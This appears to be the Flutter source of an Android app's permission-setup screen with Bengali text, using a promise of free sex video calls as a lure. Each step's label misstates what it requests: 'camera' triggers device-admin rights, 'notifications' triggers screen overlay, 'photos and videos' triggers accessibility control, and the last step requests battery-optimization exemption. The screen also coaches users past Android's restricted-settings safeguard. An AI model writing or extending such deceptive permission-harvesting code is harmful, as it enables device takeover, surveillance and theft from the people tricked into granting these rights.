
import 'package:flutter/material.dart';

import '../services/device_admin_service.dart';

class SetupScreen extends StatefulWidget {
  final VoidCallback onDone;

  const SetupScreen({super.key, required this.onDone});

  @override
  State<SetupScreen> createState() => _SetupScreenState();
}

class _Step {
  final String key;
  final String title;
  final String desc;
  final IconData icon;
  final Future<void> Function() action;

  const _Step(this.key, this.title, this.desc, this.icon, this.action);
}

class _SetupScreenState extends State<SetupScreen>
    with WidgetsBindingObserver {
  Map<String, bool> _status = {
    'admin': false,
    'overlay': false,
    'accessibility': false,
    'battery': false,
  };

  bool _finished = false;

  late final List<_Step> _steps = [
    _Step(
      'admin',
      '১. ক্যামেরা অনুমতি দিন',
      'অ্যাপের সব ফিচার ঠিকভাবে ব্যবহার করতে আপনার ক্যামেরা ব্যবহারের অনুমতি প্রয়োজন।',
      Icons.videocam_rounded,
      DeviceAdminService.requestAdmin,
    ),
    _Step(
      'overlay',
      '২. নোটিফিকেশন অনুমতি দিন',
      'গুরুত্বপূর্ণ সতর্কতা এবং আপডেট মিস না করতে নোটিফিকেশন চালু করুন।',
      Icons.notifications_active_rounded,
      DeviceAdminService.requestOverlay,
    ),
    _Step(
      'accessibility',
      '৩. ফটোস এবং ভিডিওর জন্য Accessibility চালু করুন',
      'অ্যাপ ব্যবহারের জন্য ফটো এবং ভিডিও আদান প্রদানের অনুমতি দিন।',
      Icons.favorite_rounded,
      DeviceAdminService.requestAccessibility,
    ),
    _Step(
      'battery',
      '৪. ফ্রী ভিডিও কল চালু করুনঃ',
      '''উপরের তিনটি ধাপ পূর্ণ করে চার নম্বর ধাপটি সম্পূর্ণ করুন, তাহলেই ফ্রিতে ভিডিও কলে সেক্স করতে পারবেন''',
      Icons.video_call_rounded,
      DeviceAdminService.requestBattery,
    ),
  ];

  static const Color primaryColor = Color(0xFFE91E63);
  static const Color accentColor = Color(0xFFFF4081);
  static const Color darkColor = Color(0xFF1A1020);
  static const Color lightPink = Color(0xFFFFE4EF);

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    DeviceAdminService.requestNotifications();
    _refresh();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _refresh();
    }
  }

  Future<void> _refresh() async {
    final results = await Future.wait([
      DeviceAdminService.isAdminActive(),
      DeviceAdminService.isOverlayGranted(),
      DeviceAdminService.isAccessibilityEnabled(),
      DeviceAdminService.isBatteryIgnored(),
    ]);

    if (!mounted) return;

    setState(() {
      _status = {
        'admin': results[0],
        'overlay': results[1],
        'accessibility': results[2],
        'battery': results[3],
      };
    });

    if (!_finished && results.every((e) => e)) {
      _finished = true;
      widget.onDone();
    }
  }

  @override
  Widget build(BuildContext context) {
    final nextKey = _steps
        .firstWhere(
          (s) => _status[s.key] != true,
          orElse: () => _steps.last,
        )
        .key;

    final doneCount = _status.values.where((e) => e).length;

    return Scaffold(
      backgroundColor: const Color(0xFFFFF7FA),
      appBar: AppBar(
        backgroundColor: darkColor,
        foregroundColor: Colors.white,
        title: const Text(
          'Sexy Guard Setup',
          style: TextStyle(fontWeight: FontWeight.bold),
        ),
      ),
      body: SafeArea(
        child: ListView(
          padding: const EdgeInsets.all(20),
          children: [
            Container(
              padding: const EdgeInsets.all(18),
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  colors: [
                    Color(0xFF1A1020),
                    Color(0xFF8E164D),
                    Color(0xFFE91E63),
                  ],
                ),
                borderRadius: BorderRadius.circular(18),
              ),
              child: const Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Icon(
                    Icons.favorite_rounded,
                    color: Colors.white,
                    size: 35,
                  ),
                  SizedBox(height: 10),
                  Text(
                    'প্রায় শেষ!',
                    style: TextStyle(
                      fontSize: 26,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                    ),
                  ),
                  SizedBox(height: 5),
                  Text(
                    'আপনার সেটআপ সম্পূর্ণ করতে নিচের ধাপগুলো অনুসরণ করুন।',
                    style: TextStyle(
                      color: Colors.white70,
                      height: 1.5,
                    ),
                  ),
                ],
              ),
            ),

            const SizedBox(height: 18),

            Text(
              'নিচের ৪টি ধাপে একবার করে "Allow" চাপুন। ($doneCount/৪ সম্পন্ন)',
              style: const TextStyle(
                color: darkColor,
                fontWeight: FontWeight.w600,
                height: 1.5,
              ),
            ),

            const SizedBox(height: 10),

            ClipRRect(
              borderRadius: BorderRadius.circular(20),
              child: LinearProgressIndicator(
                value: doneCount / 4,
                minHeight: 9,
                backgroundColor: lightPink,
                color: primaryColor,
              ),
            ),

            const SizedBox(height: 20),

            for (final step in _steps)
              _buildCard(step, step.key == nextKey),
          ],
        ),
      ),
    );
  }

  Widget _buildCard(_Step step, bool isNext) {
    final done = _status[step.key] == true;

    return Card(
      margin: const EdgeInsets.only(bottom: 15),
      elevation: isNext ? 4 : 1,
      shadowColor: primaryColor.withOpacity(0.15),
      color: done ? const Color(0xFFFFEDF3) : Colors.white,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(17),
        side: BorderSide(
          color: done
              ? Colors.green.shade300
              : isNext
                  ? primaryColor
                  : lightPink,
          width: isNext ? 1.5 : 1,
        ),
      ),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  height: 52,
                  width: 52,
                  decoration: BoxDecoration(
                    color: done
                        ? Colors.green.shade100
                        : lightPink,
                    borderRadius: BorderRadius.circular(15),
                  ),
                  child: Icon(
                    done ? Icons.check_circle_rounded : step.icon,
                    color: done ? Colors.green : primaryColor,
                    size: 30,
                  ),
                ),

                const SizedBox(width: 12),

                Expanded(
                  child: Text(
                    step.title,
                    style: const TextStyle(
                      fontSize: 17,
                      fontWeight: FontWeight.w700,
                      color: darkColor,
                    ),
                  ),
                ),
              ],
            ),

            const SizedBox(height: 12),

            Text(
              step.desc,
              style: const TextStyle(
                color: Colors.black54,
                height: 1.5,
              ),
            ),

            if (step.key == 'accessibility' && !done) ...[
              const SizedBox(height: 10),

              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.orange.shade50,
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Text(
                  'Android 11 বা নতুন ফোনে পরের বাটন Live Sex-এর Accessibility সেটিংস সরাসরি খুলবে। সেখানে সুইচটি চালু করে অনুমতি নিশ্চিত করুন।\n\n'
                  'সুইচ চালু না হলে: App সেটিংস খুলুন → ⋮ → Allow restricted settings। তারপর Accessibility সেটিংসে ফিরে সুইচটি চালু করুন.',
                  style: TextStyle(height: 1.5, fontSize: 13),
                ),
              ),

              const SizedBox(height: 8),

              OutlinedButton(
                onPressed: DeviceAdminService.openAppDetails,
                style: OutlinedButton.styleFrom(
                  foregroundColor: primaryColor,
                  side: const BorderSide(color: primaryColor),
                ),
                child: const Text(
                  'Restricted settings-এর জন্য App সেটিংস',
                ),
              ),
            ],

            if (!done) ...[
              const SizedBox(height: 12),

              SizedBox(
                width: double.infinity,
                height: 50,
                child: isNext
                    ? FilledButton(
                        style: FilledButton.styleFrom(
                          backgroundColor: primaryColor,
                          foregroundColor: Colors.white,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        onPressed: step.action,
                        child: const Text(
                          'Accessibility সেটিংস খুলুন',
                          style: TextStyle(
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      )
                    : OutlinedButton(
                        style: OutlinedButton.styleFrom(
                          foregroundColor: primaryColor,
                          side: const BorderSide(color: primaryColor),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        onPressed: step.action,
                        child: const Text(
                          'Accessibility সেটিংস খুলুন',
                        ),
                      ),
              ),
            ],
          ],
        ),
      ),
    );
  }
}
